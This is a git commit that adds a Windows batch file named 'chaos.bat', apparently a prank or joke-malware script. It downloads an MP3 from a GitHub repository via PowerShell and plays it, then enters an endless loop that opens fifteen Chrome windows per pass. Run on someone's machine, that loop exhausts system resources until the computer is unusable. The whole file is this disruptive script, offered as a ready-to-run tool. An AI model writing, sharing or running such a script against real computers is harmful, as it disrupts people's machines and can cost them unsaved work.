ce3a117cda3440799ee0fba77f2ca61c789e9a4b
haze_e <135668188+HazeeOnYT@users.noreply.github.com>
2024-06-21 14:29:44 -0600

    Create chaos.bat

---
+++ chaos.bat
@@ -0,0 +1,24 @@
+@echo off
+:: Download the MP3 file from GitHub
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/HazeeOnYT/theaudio/raw/ef2e92a4c52d2bcdafaf4d742a4b85d8778db225/salinewin9.mp3' -OutFile 'salinewin9.mp3'"
+
+:: Play the downloaded MP3 file
+start "" "salinewin9.mp3"
+
+:loop
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+start chrome https://google.com
+goto :loop
